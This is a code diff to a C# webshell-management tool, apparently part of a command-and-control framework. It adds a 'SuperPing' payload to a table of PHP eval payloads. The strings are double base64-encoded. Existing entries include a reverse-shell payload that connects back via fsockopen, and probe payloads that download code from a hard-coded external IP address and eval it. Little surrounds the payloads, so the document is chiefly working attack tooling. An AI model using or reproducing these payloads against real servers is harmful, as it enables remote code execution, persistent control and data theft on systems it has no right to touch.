@@ -182,6 +182,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva2IzTTlVRWhRWDA5VE93MEthV1lvYVhOelpYUW9KRjlRVDFOVVd6RmRLU1ltYVhOelpYUW9KRjlRVDFOVVd6SmRLU2tOQ25za2NHOXlkRDBrWDFCUFUxUmJNVjA3RFFva2FYQTlZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiTWwwcE93MEtKR1p3UFdaemIyTnJiM0JsYmlna2FYQWdMQ0FrY0c5eWRDQXNJQ1JsY25KdWJ5d2dKR1Z5Y25OMGNpazdEUXBwWmlBb0lTUm1jQ2w3RFFva2NtVnpkV3gwSUQwZ0lrNXZkQ0JqYjI1dVpXTjBhVzl1SWpzTkNuME5DbVZzYzJVZ2V3MEtabkIxZEhNZ0tDUm1jQ0FzSWx4dUtrOVRPaUl1Skc5ekxpSXVJRU52Ym01bFkzUWdjM1ZqWTJWemN5RXFYRzRpS1RzTkNuZG9hV3hsS0NGbVpXOW1LQ1JtY0NrcGV5QU5DbVp3ZFhSeklDZ2tabkFzSWlCemFHVnNiRG9nSWlrN0RRb2tjbVZ6ZFd4MFBTQm1aMlYwY3lBb0pHWndMQ0EwTURrMktUc05DaVJ0WlhOellXZGxQV0FrY21WemRXeDBZRHNOQ21ad2RYUnpJQ2drWm5Bc0lpMHRQaUFpTGlSdFpYTnpZV2RsTGlKY2JpSXBPeUI5RFFwbVkyeHZjMlVnS0NSbWNDazdmWDA9&1={1}&2={2}";
         public static string MysqlProbePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYVjFhR3A0WTI5dUoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjFkV2hxZUdOdmJpZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hWMWFHcDRZMjl1SjEwcEtUcz0=&1={1}&2={2}&3={3}";
         public static string UserTablePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkNGVIRnhkbXByTXpRblhTa3BEUXA3SkY5VFJWTlRTVTlPV3lkNGVIRnhkbXByTXpRblhUMW1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2lhSFIwY0Rvdkx6RXdNeTQwTXk0eE55NDVMM2RyTDNWelpYSjBZaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWQ0ZUhGeGRtcHJNelFuWFNrcE93PT0=&1={1}&2={2}";
+        public static string SuperPingPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=Y0hKcGJuUW9aMlYwYUc5emRHSjVibUZ0WlNoaVlYTmxOalJmWkdWamIyUmxLQ1JmVWtWUlZVVlRWRnN4WFNrcEtUcz0=&1={1}";
         public static Dictionary<SGType, string> table = new Dictionary<SGType, string>()
             {
                 {SGType.ProcessView, "进程信息"},
@@ -198,7 +199,8 @@ namespace C2.Business.CastleBravo.WebShellTool
                 {SGType.SystemInfo, "系统信息"},
                 {SGType.MysqlBlasting, "Mysql K令"},
                 {SGType.LocationInfo, "Google位置"},
-                {SGType.UserTable, "User表探测"}
+                {SGType.UserTable, "User表探测"},
+                {SGType.SuperPing,"超级ping" }
             };
         
         public static Dictionary<SGType, string> PayloadDict = new Dictionary<SGType, string>
@@ -211,7 +213,9 @@ namespace C2.Business.CastleBravo.WebShellTool
                                              {SGType.MSF, MSFPayload},
                                              {SGType.MysqlProbe, MysqlProbePayload},
                                              {SGType.NC, ReverseShellPayload},
-                                             {SGType.UserTable, UserTablePayload} };
+                                             {SGType.UserTable, UserTablePayload},
+                                             {SGType.SuperPing,SuperPingPayload } };
+
         /*<--静态变量赋值先后顺序不能改变-->*/
         public static List<string> BDLocationAK = new List<string>()
                                                   {
